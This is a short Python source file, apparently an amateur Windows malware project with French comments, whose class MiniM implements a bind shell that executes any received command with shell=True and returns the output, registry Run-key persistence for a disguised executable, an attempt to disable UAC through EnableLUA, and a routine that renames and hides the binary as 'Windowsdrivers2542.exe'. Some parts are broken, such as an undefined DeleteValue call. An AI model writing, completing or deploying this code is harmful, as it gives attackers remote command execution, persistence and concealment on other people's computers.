import winreg
import socket as a
import subprocess
import os
import shutil

class MiniM:

    def shell(self):
        s = a.socket()
        s.bind(('192.168.1.11',2425))
        s.listen(1)
        (r,z) = s.accept()
        while True:
            data = r.recv(8192)
            cmd = subprocess.check_output((data).decode('utf-8'), shell=True)
            print(cmd)
            r.sendall(cmd)
        #r.close()


    def registrereadkey(self):
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_READ)
        (valeur,typevaleur) = winreg.QueryValueEx(key,'DellSystemDetect')
        winreg.CloseKey(key)
        print (valeur,"\n Le type de la valeur est:", typevaleur) #Cette partie lit la clé dans Run nommée DellSystemDetect

    def registrecreatekey(self):
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\MonProg')

    def registremodifykey(self):
        keyrun = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(keyrun,'Windows',0, winreg.REG_SZ, '\"C:\\Users\\pc\\Desktop\\System32\\Windowsdrivers2542.exe -silent"') #Ajoute un programme aux clés du registre de démarrage
        #keyuac = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Policies\System',0,winreg.KEY_SET_VALUE)
        #winreg.SetValueEx(keyuac,'EnableLUA',0, winreg.REG_DWORD,0)

    def deletekey(self):
        name = "EnableLUA"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Policies\System', 0, winreg.KEY_ALL_ACCESS)
        DeleteValue(key,name)

    def Hide(self):
        x = os.listdir()
        if "MalwareV2.exe" in x:
            os.rename("MalwareV2.exe","Windowsdrivers2542.exe")
        elif "MalwareV2.exe" in os.listdir():
            os.remove("MalwareV2.exe")
        source = os.getcwd()+"\Windowsdrivers2542.exe"
        destination = (r"C:\Users\pc\Desktop\System32\Windowsdrivers2542.exe")
        if source != destination:
            shutil.copyfile(source, destination)
            y=os.listdir()
            if "Windowsdrivers2542.exe" in y:
                os.remove("Windowsdrivers2542.exe")

   
        
if __name__ == "__main__":
    Malware = MiniM()
    #Malware.registremodifykey()
    Malware.Hide()
    #Malware.shell()
    x=input("entrer une valeur")
